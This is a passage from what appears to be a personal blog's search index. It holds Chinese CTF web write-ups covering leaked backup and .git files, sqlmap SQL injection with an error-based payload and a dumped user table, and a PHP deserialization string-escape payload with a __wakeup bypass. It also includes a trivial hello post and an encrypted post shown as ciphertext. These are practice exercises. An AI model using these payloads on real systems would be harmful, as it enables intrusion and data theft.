punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>问题解决：0xGame{V2ry_simple_XXE}</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随缘的WEB Write-up</title>
      <link href="article/suiyuan/"/>
      <url>article/suiyuan/</url>
      
        <content type="html"><![CDATA[<p>by:gyy</p><h2>WEB-常见的搜集</h2><h3>信息收集</h3>题目链接：<a class="url" href="http://10.147.19.176:7001/" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7001/</a><hr />敏感文件Hello, CTFer!信息搜集之所以重要，是因为其往往会带给我们一些意想不到的东西<p>hack fun</p><hr /><h4>yysy,确实</h4>信息收集<h5>Part1</h5>遇事不决，先扫为敬真·找到了<pre><code>/.index.php.swp</code></pre>知识链接：.swp文件是备份文件，平时vim强退一定要注意.swp文件的删除！<p>进去访问下载<br><? php echo 'flag3:cDBydGFudF9oYWNr}';?></p><p>发现flag3，说明flag分为好多部分</p><h5>Part2</h5>扫描还扫到了<pre><code>/index.php~</code></pre>直接访问得flag2:c192M3J5X2lt<h5>Part3</h5>将扫描进行到底还扫到了<pre><code>/robots.txt</code></pre>进去康康<pre><code>User-agent: *Disallow:/flag1_is_her3_fun.txt</code></pre>访问得flag1:aW5mb18x<h3>最终</h3>组合得flag<h5>小结</h5>扫就完事了<h2>WEB-粗心的小李</h2><h3>Git泄露</h3>题目链接：<a class="url" href="http://10.147.19.176:7002/" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7002/</a><hr />Git测试Hello, CTFer!当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。<p>小李好像不是很小心，经过了几次迭代更新就直接就把整个文件夹放到线上环境了:(</p><p>very easy</p><hr /><h4>Git</h4>访问<code>./.git</code>发现跳转到了<code>./.git/</code>根据题目是git泄露<h5>神器Git Hack</h5>命令：<pre><code>$ python2 GitHack.py -u "http://10.147.19.176:7002/.git"</code></pre>扒下来.git文件<h5>分析</h5>命令看一下<pre><code>$ git log --reflogcommit 213b7e386e9b0b406d91fae58bf8be11a58c3f88 (HEAD -> master)Author: Veneno <593220746@qq.com>Date:   Wed Dec 4 11:04:14 2019 +0800<p>flag<br></code></pre><br>发现有flag<br>恢复一下（注意，这里要往上一个目录）</p><pre><code>$ git reset --hard 213b7e386e9b0b406d91fae58bf8be11a58c3f88HEAD is now at 213b7e3 flag</code></pre><p>恢复了<code>index.html</code></p><h3>最终</h3>在<code>index.html</code>里找到flag<p>问题解决：n1book{Z2l0X2xvb2tzX3MwX2Vhc3lmdW4}</p><h5>小结</h5>Git hack好用，还有个git extrack<hr /><h2>WEB-SQL注入-1</h2><h3>SQL注入</h3>题目链接：<a class="url" href="http://10.147.19.176:7004/login.php" target="_blank" rel="noopener noreferrer">http://10.147.19.176:7004/login.php</a><hr /><h4>SQLmap真香</h4><h5>sql注入不说了</h5>sqlmap直接跑由于是POST测试，抓个包下来存文件，在name处改个<code>*</code>跑sqlmap<pre><code>$ python2 sqlmap.py -r 1.txt</code></pre>出结果<pre><code>sqlmap identified the following injection point(s) with a total of 1488 HTTP(s) requests:</code></pre><hr /><pre><code>Parameter: #1* ((custom) POST)Type: error-basedTitle: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</code></pre><h5>Payload: name=' AND (SELECT 7087 FROM(SELECT COUNT(<em>),CONCAT(0x71786b7171,(SELECT (ELT(7087=7087,1))),0x717a627671,FLOOR(RAND(0)</em>2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Uilw&pass=1</h5><hr /><pre><code> [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS: MySQL >= 5.0</code></pre>ok，直接全扒下来<code>--dump</code><pre><code>Database: noteTable: users[2 entries]+----+----------------------------------+----------+| id | passwd                           | username |+----+----------------------------------+----------+| 1  | 26f1c86def93bd19fb3ba6ad3d9f2a87 | test     || 2  | 26f1c86def93bd19fb3ba6ad3d9f2a87 | admin    |+----+----------------------------------+----------+</code></pre><h3>最终</h3><h5>Payload =<code>sqlmap.py -r 1.txt -D note -T fl4g --dump</code></h5>问题解决：n1book{bG9naW5fc3FsaV9pc19uaWNl}<h5>小结</h5>善用Sqlmap，能跑出来的不多了...<hr /><h2>Unserialize++</h2><h3>反序列化字符串逃逸</h3>guest.php先上payload打到admin，字符串逃逸成功<h4>payload = your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;}</h4><h3>index.php中</h3><pre><code>file_put_contents("caches/".hash("sha256", \$\_SERVER['REMOTE_ADDR']), put(serialize($guest)));</code></pre>而<pre><code>function put($data)&#123;$data = str_replace(chr(0)."*".chr(0), 'uuuuuu', $data);return $data;&#125;</code></pre>每6个u换三个字符，使得name盖过pass的字符并"闭合，然后反序列化就会读取我们准备的字符，即从<pre><code>'your[pass.able=AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;'</code></pre>的分号开始<p>本地.&#x2F;caches&#x2F;下的内容</p><pre><code>O:7:"someone":3:&#123;s:12:"uuuuuuyour_name";s:60:"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu";s:12:"uuuuuuyour_pass";s:53:"AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;";s:8:"uuuuuuadmin";i:0;&#125;</code></pre><p>即后get</p><pre><code>function get($data)&#123;$data = str_replace('uuuuuu', chr(0)."*".chr(0), $data);return $data;&#125;</code></pre><p>会读取</p><pre><code>"O:7:\"someone\":3:&#123;s:12:\"\\u0000*\\u0000your_name\";s:60:\"\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\\u0000*\\u0000\";s:12:\"\\u0000*\\u0000your_pass\";s:53:\"AA\";s:12:\"\\u0000*\\u0000your_pass\";s:2:\"AA\";s:5:\"admin\";i:1;&#125;\";s:8:\"\\u0000*\\u0000admin\";i:0;&#125;"</code></pre><p>忽略不可见字符后<br>读取到其中</p><pre><code> [your_name:protected] => **********";s:12:"*your_pass";s:53:"AA [your_pass:protected] => AA  [admin:protected] => 1</code></pre><p>然而本题和admin<strong>没有</strong>任何关系</p><h3>构造</h3><pre><code>O:6:"level1":1:&#123;s:8:"username";O:6:"level2":1:&#123;s:8:"username";O:6:"level3":1:&#123;s:8:"username";s:5:"admin";&#125;&#125;&#125;</code></pre>payload =your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=A";s:12:"uuuuuuyour_pass";O:6:"level1":1:{s:8:"username";O:6:"level2":1:{s:8:"username";O:6:"level3":1:{s:8:"username";s:5:"admin";}}}<hr />check不允许匹配到"username"字符串<p>于是准备绕过<br>类型的字符S使用大写<br>u&#x3D;\75</p><hr />level2中有__wakeup()方法，于是绕过<pre><code>O:6:"level2":2</code></pre>例如本题，<pre><code>O:7:"someone":3:&#123;s:12:"uuuuuuyour_name";s:60:"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu";s:12:"uuuuuuyour_pass";s:53:"AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;";s:8:"uuuuuuadmin";i:0;&#125;</code></pre>我们有u x60，最后换成字符30个，于是反序列化会继续向下读取<pre><code>s:60:"**********";s:12:"*your_pass";s:53:"AA    |（到此为止）</code></pre>然后"正常闭合，这样接下来就会读取我们构造的字符串，字符串成功逃逸<pre><code>";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;|（到此为止）</code></pre>下面无用了，因为}正常闭合，反序列化结束<pre><code>";s:8:"uuuuuuadmin";i:0;&#125;</code></pre>以上是admin的方法，取flag原理方法同上<h3>最终</h3>payload =your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=A";s:12:"uuuuuuyour_pass";O:6:"level1":1:{S:8:"\75sername";O:6:"level2":2:{S:8:"\75sername";O:6:"level3":1:{S:8:"\75sername";s:5:"admin";}}}<p>再访问.&#x2F;guest.php解决</p><p>问题解决：s3c{NEJHdTBFaWJtekd5QFptRXZiTERTVW5rRTE4UDZrRio}</p><h5>小结：</h5>字符串逃逸字符个数<strong>一定</strong>要算好！（吐血]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="article/Hello%20World/"/>
      <url>article/Hello%20World/</url>
      
        <content type="html"><![CDATA[<p>hello</p><span id="more"></span><p>这是新建静态博客的第一篇文章、</p><p>这已经是第三次搭博客了…</p><p>马上搬运原文章来，记得做好备份QAQ</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux C++编程</title>
      <link href="article/linuxprogramme/"/>
      <url>article/linuxprogramme/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码不太对，别想骗窝." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="7fadfd42095d9a5d532ee0d5251a01b5c2bdb5ddc46b485ca0cad90ab5110a95">acff4705a538ab3d2e8d1867fa2b50da9a1640994d2649191c3b0d2882ea059e078ce3184479436ba540ea736eea00a26ef0d47536e6a8ba1ece4fa00d4edfc233661a1f5b528136d53602d2b07301d71f9695a477a81791e35a9631c780471f95636cfb7c7f5d180e87d9cef50eb4b3afcdf001a7287781e75f53d874dd9a0c7c911688e13a1671db82580110dcd4b040114758ef2b6aaf3a568ff7cacea6995c332cce3a1be7ed0e22fc1f34b1ed30e70d19f171207485f62577b0b370b16a825183ec394933e2a8f1bf5f8d142143e4edab1dcea56c5b226d64d551845761e85e400196f08fe825dfd93165871300dcb1fc2172d038f6f4b1176fb30b9fe395c249fd888cb817f9dda6256a5fce0746ebf57c60969c2d3a75a317ba75ef3fe3151f72808ae660f25135ffad8aa3372189c5bbdb980384324f93b9288549564233dd26389a920c84c8b7ab071383b570bdf23312ccd0c5685a4b2e6531369f0f04924c94ee175fb22c716c8f62504d7f60a69b5b3eabb35fe31d9d4bfb8f0985d276d9a582dbcbbacd10b94fe5be25d5b897ff7fbc82b863dc322796320a16514aeae3c9ccd63a429f524e11e060c19488c773b6c220e09acf8174cdd25655398d925b48a6aa36b5aa5d512bb625d7e74c5af313743468aeefcd7bd074408ef210ea6448bdc4c6cec31eb4e6015f19d176f7431218dd110c1d04608b608e6a63d7f3e3b0cd8872a1e2bd82bc139ab71368408646981e17874315b0ed35d05f0094378364aa3a83da26d9990e5808efadc334c4f21be2fcd427be75052215898bc10e921573d1628f05676d370397956afd20aa2a936c021dc5be076994b66178d1c6045a8e0406d7b5a052b7cd2d3b32a2f57e071ac160ee081589f201b15b9e5d4c71ae6ab9115e1999ca5920c27a91742a681b91b4e0305436027e23690abc9329937228cd56401356a088986407fbe53b1794155ff97cff62b25f13bf7c17a452665bb6327eb5f716476be97a4df6312dd26a5dc8a03b237ccc335e2904cd94a243ecc33ba81dccb3ebad805fabcd26cd92e8e0330af6d71d735da4a9c23b4498c79bd69f1a776568964f7a31f6489b33c9c5cda2b222ced1b660afdeb79041e1aa4ef68ab39434cdf17766c19b7fa3f073932bf82ff9694713fcc9d39690b937b316330b0cb4c59926b75ee430087721c14ecc389dbb6c5c4115a22539eedac290af69eb00b539dfd4f29989cbda4c9c55a0c30075378a7a8043e8791ee4fa43c921f26e55f493782b3529ee5c0559d9e8d60e402357a01412a4dd9c5f13564fde1283e6afb4db3ab0abef872cc3b75cc0daa1adab2d8436117989b6ec04cfbe1cb4fc64449aff0b8a10d04a7d69a7ab3b814e45c847ff0a597de1ef6a04024e0c5fe6cfffa49cba91c0e3774fa1644fb50b1fe4a0b20d7b9e313e1a0e21d185e9d5700ce15266a23840aea3d31262657092aee1f28775dd3a7fa69783017af91e62623f2c47f7eafe7ce6e399e0992cc5469f03974cbf01f9772d0500545d4bf18ac0181154875c2abaec2f7bacaae150a2a9f0017792b593e6ec484425026118376eb887a8069e46503ad843d3b7dced11b7cf4b38dbbaa750646560627defd2d3a17284a915681960e17983108729a5e429168a750f5aadc7781c49917f1e3b6fdc643bde01954e23e3ca3961e9bbdcca76412e7690ed8eb80a94660d7cbab93c2b755775f1aee50c8b3a34feb851666e9efca9ae0cd9deac43479e1d8630bdad556df28730c1f58873f565f99546396378a20d89d24b62c905c4719a9b5aee28388b9b0411a42a7ba2b8b2b834b3247145823264ef3e807e03015d11aa3c1d2c6ce83112fabd54772676c99844f74a18e571ae00c1882396c5b1ee60ea2626e5aaa3820fcd144858a60b4af9da548ad9d1857d7bcab6dfc22d2003f8b09b3974e3fce29e6d58c819e55d24ac8a89605dde5837e67f3921a8ff443a156c604fd22a3e909695112ea18f166d7b848d629c8c3ae354b9d802d88c3cf4a8d6e97ff386d25f66ab7fa0775ba9ddcbcba443a7265e1def9518d06ed2df3cbf5394b360859f5e5df3bd2fefad3d88bf185622dd876fce7af584c53ebed60ca6ec5f4b8ae3bb7385b57ccce826a00114f301f00d6a90118f368c26379c2f799a63a02c91031d919483a9362db895eebb53c0d286c746aca4bec547bb898348a360f6b88a5614d6272ba4873123863e87d77c99bc0a70f7dc85ccea00c7729f982b220b15a04d5b45bc09e21d3d8faf363dc085e070c7d4e5260c7b49187ed88b269541ebf921c846e7fb29fa11daca5834e1def7589c3e1ccfd47d3fcc11f5a205780ee8e22c3aeb6c65b9fdaa4ec9cbc1af7c61103ff34c14157ad050bdf9b33b7afe720edb8073ec69230659f7aae8577ab6bb58f9f309024e5506cd56646675f8e04c7ad793e7b8f385e6501a299a3dc7a25f9c5f2d86e4b1ecd158cfc34447489679ff16e7b8ddd32b8ad57b81516b6125166de0f230ad8621414f6b3546d68729ef4bdd6fd9672395502ab53b68b66216dab594ec18d3e241aaec1ab32b9ae52961fc24655dc656b39654eb05d5882e30fe54131da7749b7077fc7ac5b90d48d47e070e5f95d67d9ca4d208c1a4e86afb88ddabbf774f36347a4bd65b168cccc56e445415b75ac2a8612a256a68f265e9cef13714230a214cbd0b12315a5e3fb7009fa2e57316d8141f5d4194478eec7b5012264790d178215b6f3dc1479561a2f8f58ac82a80bfe6ab605ed867d5a87fc5736c58a8ca9ba133ed52074761fa884f556f0456dbb99ea1a0a2746b16ecb57cf908f649334cce74c263c56635f64e6f77745dbe1565db367c0fd4f60892198cc39a0a5ad8b5a252fb6e1342b133cf83de7454883fa34dd82647cd9bc58fa8bba0f6d3d4ceabbed1a4d72651073e961663ceedfb214354ab05340b90397fc74f95568bd8f7c55917baa32402383b142d3f2c3f59cd05d49b87740acea20d7619cb37b4935617821d7663a3a7724b555741d3f78d46e28f2edef4f2cf1bef748ffa7def286d9c1e4567a94b8fccf28d4273aeb0f8e45c5c38ceb997af5c0712765d2b8d3af57dfca6983ca511c539adc332d0f0e7156dd64b60b458715c41788cf9a7381d1d7f56896b06c34d8ef81537101b1d9b61f058464f2e1bcb4ac3f7d31a0e37c2c9da9327cbe065a2cf6a4a49bc0bc58991bedab672e7044cab45f32c8b8b9501fbb6cf3291084d84e4213c4e7348d2900c6bfbc539a582e950de253c2f0f3f9c3e4b1c8f00b44bd56f4b0d2f091328c3df438cb0b7faca9a756c055b6e1fcf53c5bb17606b73ef1cd926b1550e9f34fecebd8fbff102d43201977a43119dfea025a0f85c72c1fa45e2de35fc1b07be2993b7b51400c53ba964a3e2385dde452d1dcb84b6cb44a1040700d369e6edeb7e400688b122ab1eaae288e603824c96af6a7192e887acc1d0c52804d5786b5f7413d76a5173e596efc81b5da585b947b607c413774bdab702ebfe663b76a4d43c48c15b46004e8ca12369acc2daaaf5f4086256a2491f38f2c553b89438737335ace5a85098fa3f80155d91a07f8ab789fc36460d0d2a14357e84b6e6bf6ceb885b99dcf88db8bffada4f375bbca37a348119a094b6772c2964799bb0a4af10aa8b0c74ca4fd2af15d2792d9147369ac5ad48cbeae2dd8f64de242537869641031ab377f14d93fabd7d4e7f8cfbed30cb8c5507d481a0ad27383dc9e5419cf34b9d9c62c96ef00e24c5a447d65ed4653aef76672cf5fc8fd795ff63ce2d72b5071d8abda1ce0a8f96b9d9c8ebb95ee0ef5720645153d38916073adb14657b56ff891ad43d7f188535bc3764ad5fe8ae459fb80720e8cce01af5c54bc61ecbea5a1a58202473718e035def7665bc010e6a930f9d7d5c3a2a17da57cccc428f9a43b51c638d2ffd1b5f3ddad053db45eb418907054de0a173081e3724a775b26bba11c40dd6dea46b6bfa043157ea2e8efc866dfe6aa3f49a700915168bf39a240c0c282a5190e7eab52550de7adedca5eb4c57f621362bb8bac2cb73e967690a0b20e1aafa66f208e6e1281d970fe327c4c351568ce0c92d5426847a435806d7bc944d82364c9a2674b90a9d25a8e2ece362b0fa2fddec439157c79558c1b3ae2f9298d2d5e6d302488dbeb103b92a8a427b1b8588bdc51db826fbd3fcdafeaca470c60fb8022b13e32dd402746785c4f08d7cd46e1987ba37aeeaff36ebea4a969cd2511f9a003f5ec1e7212fa198be8cf62b9d930e62a4229efcd1ca069246b02fe61f9008049caccd6709bfedb7a775ee2978cb4e78a017178b16eb432d9a75a24660104ea97726cff099889d3e5095204e0598cdc3ccd375b175af13ddfe0d76cf8bbea46c4a4d0e97d96cdd9b442b99e6f8ceaa79693b9eb7c9f1d540283d38ed71aaf5dee6249999eef62d1540a4e5fd03fc32b5ec23e0a7567decf44b4744fa7d32e33ff318c142057b89394c0275e4684c1c1ad9bbf0100fbb6fae4d11a872cea01b23db997b40e0f964d8a75b71d4107ff452c720693c7803684594eaf3662675b075373a90054ad804a95e5bd1fe13d31647aeff48d691a77a5e009cd27093a1c65c38c36604af05d9ba78b1da6e23fb6a50250c218df8b55a2a2b2a856af05685a209a23ca3fd9f7c196f4ca92a62eee679669b0482ccd7902b3c9dce3857b9a1090ad473659bda41182df3edd5c14ae9340ec988de21fcbf72e4ef15f2c5c67077e3d3ba08d251862739f9a0e9746d98092b9b12b9b758ee19e9bec78f70348c45ebfa7abbc42c2ae792401994e7c98218181dadca8bc456432819dfdcd5b07ee0447373ff0dd13aec2445e6826e58a085fa8c60795481f1035e0675a77a188db57bb31b5b765f1c452d149c9b5798059229ef880ac2e5bdbf54b6b276e348cacf1c0af850273d5e57c3e0de9f877f5bdf63d5debadc49f43c9169e75b806d44342a3bc5619c070065e22d5320333f6e235db0aa5677c9e391e2c10a50b27287af96fe2d5a183946f2a862065dbefd6db05d3ca7c9dc8e02bb53821bf6238be99b7987add8afb26aed896d4fcb580571f36245888bf93678fcd234017cbac33f3ad1b69ef0f27332f3c0f42ce18836dd5d45a75d1370613b685d2e8bd1a068e7c9c83208454ee12dc265098161888970c49ee719c9446b29ddd68c4496de318b5172ad63f13780ea6a4ca3f01ec8461faf4d96997a4c377eac2b5f5ada5f96084a89335471f9cbd6022bba4d3d83c89111afff3d214e0f466a667295a12f13428df50f937ee739d63bf8f786aab3b98f5638838cdf1c216bb64287bb4c7f4ccb00e266dc04b26d88169f7c1de6f86a4a3e7b2303291896bb99b0dc15f94f7ac09df6b37e586c637e802a0bae92efef361f75a2d160d8c78cf4b29b2cae83e27dd9cb919f5b5f12f8011d63029f8bca18ee76b5de9515be374e5bf03ad905327430ae46148006e103b525bbd54d433a41ff1f06cc011f531d9a582044bf869aba6817b9bdfb5e48459b5cffd70ce13ec0f45a39f36734530b0fc98616d934bd33803240a0336c6396cb7333bb09f0c34a8a9eb7ef2913f0ea910efc65b6bba4f9679daaab98c22562b877535a5153472897e3b123beb48e8c3b9d98428a118eac05d75de29f1dda269f46c42197f6b35a4d531bf0518a305bbcd3755f7f71a3bc0517d7fc3d95fc3acd55f8e74bdbc812c42b4b740d82b343308d3cc39bd37d917cebd90cb38c894586de6035d45eabbed7fcc5081199d9c56489904e93c8e5365d4a729b65638ad6b7ff3a2c8e914b535f1bc4184e63bf61484b0ba3120c6af7c47d9076ea037b1a0a5e85834513080ea34a31c7a24f24c3eaefeafcc0d6b7544107f21f06c102db9500f841320d4017a3e85987675baa2081e5f62d03d9ed56d68823dcc161c1cd9a3063c6cc363b280ac3dbf1f3d87337089c3213a4fffcb7712c5f9914dc6afa0c24a6a02f1c6da12a49cb6cf22479909261f52616b627c933720f437906eeae6bebe393ab8b33176d27093b40c2061c3d23677f3350c5a13c2379fee1579eb7c60e18f363ee3e9b8e00f30454610bb5f81ed6b7694d837a7ea121809bf032685dc52859bd9b314554f6f60911000eca2650cbbe5a5ac749aa331141c4cecc35b4d10cad16f4695ec927def5eeb32cd0b0c81099b52e700353bb3659a15297321db522024ea4078932b74c72b15faa439bdf64d590ffd7fc1aec0490f22e9b26f1fdf011790279861f8ab741067877a812551e628461ce69c539479dc11a236da9b306d92eec554d9a02681f9ab65c12d161be89779be8fcdf1186497c5d4dbd7eba05c580e9c36f8f76c4c5f37ca73e4ac765e1a66986d6aaaf0625762b33541770c1ae1fbe418b8ca1ab2ba5eb80f81e419f8132870e2dbb4ceff837cc5c14ad1d8b55853d290a4edca8770dd8e4d0a22e069153d197f010f39e52eeacc5ca8415afcd5a6e9408d6a780f8624aa09a50506cf500af1807569af2d7740a0178a75818ca37f494ac2e11d24c7465c42088989d4efe9cf272749048b3916884ef782fb702c553a693079d0e70666add009c6a9f3d329ee00ccc5b4d847f19028c7bf275caee6a18abae59b7471d09b652f24626e4f90d665913911068e4f2b5fd1795c521d10b700731ab461b4311ce44a21a92442e3dacf83021b567a77516f2a62b5e253074c440355bf50cd65597b31cfd3ef7306a7f45e5b69362b57bac9e9271cf1f00c6de665078d9fbd55e403be162ede66e72029ab061f91cc904c4f1c82a010b6ba8b3dd5ae253e021fdd65788aed992ef5e6c6b845fac2c47db5c94e370fab707d328d0162954205443cb0d400c3fa7a2e64610e3dd62f0181d3f2f30a601321430cc1eed0be58b438034655c9254cc2a47244ab4ddc5fcf02d8b175adf9dd41505f278a0cf622569a88d3dbcd0d42b4476b150fd8822c8dcc6d5456905964a01490f5c8a0f26f22318c4fd49be5d39db385865ec09338323e18fc4571e162b483eb9b8dcb2cb5e44f9c6757d0cefa141cb7de3594b7c04d3947b29ec24406c34075d5691cf3ccc53ad1f5c131156165fdcef2d3dd4aab43d480d005e2d7d4e557c61e9bf317876c7f524bd7a17e519b8e52b42252204bd8704124a13aac56ba1334c26ae5cc64c44c2ac039a12d983f65673111235e746bcaa357b8b91e552b1a8fe6afaa34fea66947d07ee307f717dfc37b0b1e59e8aa26532722e86d8141c7029290f242a5c75c2013d5e92816bb47c5f0896c728d2d3715738a79cf085137a677a87fdaad133c3e63efd66957b561a5737125f3352e24fe2fcab08c3707634a0dea72b000ede495cebbfbbca5f8d3792300749127bbac8cedb31a89a2127d31aa0dbacc3ade322e1fbbaf4b6c51620bb5dc29bbf029e7753377f07f38027728cf60c621894f7df01d75ccd99dad4a1fb534d6c09e3042d103fa6509773d3f899158e5556300a8b3ade4705ad4a5661bcb1350f993d4123122da7bfd27f2193c17346d00984e2eb657db9bd4d2e6a8b175533dd0fa07ef4c976f9073ee439d4bbbd73b6f101f645eae1062f47995a05109fd964045543a92420c54adeddf2f93511d8c434b43716948d0fefc0433479df8da0a3a32e95d25946128e920b0c40c31a1332e654c54396561d2585f2eb4559569788621aa96219bf98a8bd75cfd2d0e6556ea0aefe087ae1cba41b5f1ca69ff515a48781360deb31e069a1e80bc4490807f681f60b9a89994a355998bd5e8e515e0561dfbf131894d8c9e5814d4156298c9a9746b1285ee885bc8def20cd56f1f649e112f31f5bbd4784dd6d90a2a4259485a8b87d7e56593951573cb55c3ff9034bdbb4fffd9c6f04d94dd46050813f06aa491b7929b9fd86c8b09576952d7911aaea4e23aac45840d8399741355731acfdd9662fe9d9206dc1e6e18b85ea061a3cbe4b47c50ba8085ef0c5bb783e79cd603809dde7931d18264090a135fb8559d930686c21bd157e87982ec6f0c564a937b56db8c861a67292c9b8180380d78110ac1757a8f80744b94775339136e7f4f4b1a9a723019dd48082247ac7791a7c1ca7ed08efbcc64b30708f7601fb1d40c792dfe83c9d87ca8a858076630a5d3ec8556375afbcac8467b06deb858f9df106f52fe12d2633a314b4e01c586a87be1fe9d4a5b9cd5a8dac1408b49016aeeb53fc3414cc8941dadadbf70c55b7e4da765ba80228a1d31350ece6f3dc72dd00a6be5a6fb5abfcfd4ca582fde6149b7abbe08b3633aa0554f9017631a5d2926cd26affc7c4dce24e8dd7e93aaa13a14fd717b03c63b7697fb0c29ca4cd62421e9a494ac17b00172e54cbd89c7140306ad55855bd0777254dfc88591a7a5b4b937dbcc48f5dd3243f59fef8f9a926854fca9d9f5c98547c9316ccc09e23828dc9f9293ca31e75884e8bf9fbfa789b13f4ececc3b4a1541bf4fc5c84001fa87a3f93726648fa2efa4d6a3e529b9eb9aebd47eec41fdbdaa4ac35d8bed5772d907ac84e57ce0ab88f20b95936dfecd4fcdc2f202f730ab51d9c99fc75bb60618a0ca7aca3b748abc7255a978394396297d43142897973ca613f083c3987f7c6cb69329fe92f901a20ca568d71a154a06f1f2b1314dcd22b661c98a4ba8f961987af34718ad603092a70e9175a64ab3ab94434345bb3c8da2fc3544484541610526eaabc79122935c6b193410417863480009ac5453fc2e5e1691aa957ba0be2a54abbcf801dac51bfaa3285852143622a4a0b1dd74ed8ef0991c2b28806db2c0e2ec0c0d5b7795f74358550b4312f9ff983cb5ef7beb4d704a1eda92d8d28d820f889715ebfce1465d43e5912c3f31137ff83354251f55d790d9e1406ed38cc960630aefa542800b7302128935d0ca88e8f21c776e560a87804f8195ffe082aca52b5cc16a70defd10688f31657044c5e504bafbd2b5fc32c733600911d3f030c7cd5566d9977314cc9ca84c16700c9c262a4248ecde40abee8e8405dabb2daa0235046171519324295f32d2551955cedf1cf156eb54b50eb8465be9ebb1e91c0ddd9334cb474c83013395c95744c504c878f770983b1d07540ed13502806ba4b8017a5cc7c0757ea67efd27525f7d20a964c15a3b200262e917c5596553d6c8cc3ef32749b85ef6a5cc34f1091dc33ade5ccc962b42e452c29df984353cdf14e8759204f624476f1439aa0285a68080ccff9f242c51252f6081c4ea3d8da56a54c22c5d9db4816dc0f20b88732fc48c1e8dc990515620a5fcf35b06286ae73e8af01fd15ef28bd2729b7e22079b4f48b47da7f9656a6db32a261d9184722af187516df9d3ea84c0ba277a5b8262ce9ae9de8c238d4df9c3c21653ccd933e4597870d510ff9bd6747f6dc29b4bfbf690bfe4c0c8726cd4a8152c8a286786b46217e53a0a5bb6a975b20fab3bd4e648795384d294e9b11721e0b845334bdf391e6c9ee4383af601a0a4c978d217fa38e00539bd479acf44d3531d9b89e3ea169791991079611ad63075082b74a3be71a876a9c37c3ef2b589b03626e26d8bf96b655a409d21487c457bd7f3ee9c69c5cc77621085d660bc5f94e3b691c4fdc8020fc953a5e38dc24bf3fa50fa96cda41497207792a7aa4bfd61c834e79d225c267762b3f55cefd6b01fa631ca0679b661edb20b2b41c2b41fd1ba1801d77a72e50196a5f9bad6c5213a53f7a45b1bae31ca7c5e243dd086951fbd65b9bc4e49d06a4aa89d2e134b25fd28aa4dea64e4bbf8309101a98c52e2df34532c80e3869c44e7d1ebd79f3aeca16d139a2b554f207c3c3576a4997a35d3b872bfe0397eb42dccb083b69d68daf362769c91d3849e43f1db66d5ee650141caa3dbbbd0c8bed1859b68ad292743266d8321a154b4a4a1e2c0cfc36dc48fdab2a48677102b959e7d64715a7a04a0a6cec1755e5403086807199fbd27907d46a89e2ec708e5acd965e7b5174324dcb49b7d4121b43742ab11a96f1ada560e1d9842c6fd5745a1535e7fa6aa05ad29bec4ffd5519bc0b0c11171174d17a1ca1371a38e29d2531daec2395cd8bca29da3101a94f76216ab537568ed29d609fd2742f5bbd11aa622880fbecb104c6539842e8082eb35c305f145d1dc78edcfc1b7b9cc0fae3a04c99dd2b33a0f89cb63923f56b263c82b7a1c5c419a2872b885cf017c7b9047acdf5d683a9ea39aeeafae3993d199b1b79f1e78029bdcbbce01a760c04b1d9e8c0cf42f963bacdcd8e524f219711ade00ac11e5ab9b5601161200d36721e69fb0733c1d6c5c8e09b1d63adb9f4c1178b6af074f90a97e300a621f92d75c2bd38b190ba9c5f16c68ececc72516c91b21d0bd5179ab40d55aa0abba24b1f300bc7742f6b37cf099d47d591bd06b7daebb059e0d304997c94a34dcc63b385440320c62a714982a700857d6d7eccdeb4c08a472119118b1e9ad38d046b8d158b50fc9edde966495d1d4d655e6282108947779a9d18ed3e4664b4579e2f699547c123381bc019e159eeafff9613106cac5faa0bc9831d773071e283c975cea0b75af349b65e657a255a1fffcf1c7573bcdb674a5979cb7c5915ae3f37f7cd56ce156d4a3053ee31a390cfd477c828b635776d1d2b7af6aa189d253d972d0a99b36bfbada978020dd6c2a8007694b0c41acfebe76a155c9a16078dd2996dd80838377fd4bfc37f7442021d17fdc8f6ed3a227338f0363e0fe84e2bf69c3893622522874af3e3c261fe4b5caeb9710532069773b1ddce76af92515404e9201f234f0e27a99f5b0a83c2bfab062a962d6773a5c115f3332